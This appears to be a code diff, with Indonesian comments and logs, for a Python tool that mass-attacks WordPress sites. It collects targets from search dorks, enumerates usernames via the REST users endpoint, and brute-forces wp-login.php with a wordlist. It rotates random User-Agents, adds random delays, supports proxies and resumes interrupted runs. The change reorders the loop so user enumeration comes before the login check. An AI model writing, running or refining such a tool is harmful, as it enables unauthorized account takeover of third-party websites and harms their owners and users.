@@ -110,7 +110,6 @@ def find_targets_from_dork(dork: str, limit: int) -> List[str]:
             root = m.group(0)
             if root not in raw:
                 raw.append(root)
-    # filter dan ambil sampai limit
     new_targets = [t for t in raw if t not in scanned][:limit]
     logging.info("Ditemukan %d target baru", len(new_targets))
     return new_targets
@@ -120,8 +119,7 @@ def get_usernames(target_url: str, timeout: float) -> List[str]:
     api = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
     logging.info("[%s] Mencoba REST API", target_url)
     try:
-        r = requests.get(api, timeout=timeout,
-                         headers={"User-Agent": random.choice(USER_AGENTS)})
+        r = requests.get(api, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENTS)})
         if r.status_code == 200:
             for u in r.json():
                 slug = u.get("slug")
@@ -175,7 +173,6 @@ def bruteforce_wp(
     session = requests.Session()
     proxies = {"http": proxy, "https": proxy} if proxy else None
     total = len(passwords)
-    # resume
     start = 0
     if resume_file.exists():
         val = int(resume_file.read_text().strip() or "0")
@@ -188,8 +185,7 @@ def bruteforce_wp(
     try:
         for idx in range(start, total):
             pwd = passwords[idx]
-            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}",
-                  end="", flush=True)
+            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}", end="", flush=True)
             time.sleep(random.uniform(*delay_range))
             try:
                 r = session.post(
@@ -258,15 +254,31 @@ def main():
 
     # load wordlist
     try:
-        pwds = [l.strip() for l in open(args.wordlist, "r", encoding="utf-8", errors="ignore")
-                if l.strip()]
+        pwds = [l.strip() for l in open(args.wordlist, "r", encoding="utf-8", errors="ignore") if l.strip()]
     except FileNotFoundError:
         logging.error("Wordlist tidak ditemukan: %s", args.wordlist)
         sys.exit(1)
 
+    # ────────── perbaikan di loop utama ──────────
     for tgt in targets:
         logging.info("=== Memproses target: %s ===", tgt)
-        # skip non-responsive wp-login
+
+        # 1) Enum username dulu
+        if args.username:
+            user = args.username
+        else:
+            users = get_usernames(tgt, args.timeout)
+            if not users:
+                logging.warning("Skip %s: tidak ada user ditemukan via REST/API.", tgt)
+                append_scanned(tgt)
+                continue
+            user = pilih_username(users)
+            if not user:
+                logging.warning("Skip %s: user tidak dipilih.", tgt)
+                append_scanned(tgt)
+                continue
+
+        # 2) Baru cek wp-login.php
         login_url = f"{tgt.rstrip('/')}/wp-login.php"
         try:
             h = requests.head(login_url, timeout=5,
@@ -279,20 +291,8 @@ def main():
             logging.warning("Skip %s: tidak bisa konek wp-login.php", tgt)
             append_scanned(tgt)
             continue
-        # username resolution
-        if args.username:
-            user = args.username
-        else:
-            users = get_usernames(tgt, args.timeout)
-            if not users:
-                logging.warning("Skip %s: tidak ada user ditemukan", tgt)
-                append_scanned(tgt)
-                continue
-            user = pilih_username(users)
-            if not user:
-                logging.warning("Skip %s: user tidak dipilih", tgt)
-                append_scanned(tgt)
-                continue
+
+        # 3) Lanjut brute-force
         logging.info("Brute-force %s di %s (%d pwd)", user, tgt, len(pwds))
         found = bruteforce_wp(
             target_url  = tgt,
@@ -304,6 +304,7 @@ def main():
             proxy       = args.proxy,
         )
         append_scanned(tgt)
+
         if found:
             logging.info("=> Sukses di %s: %s / %s", tgt, user, found)
         else:
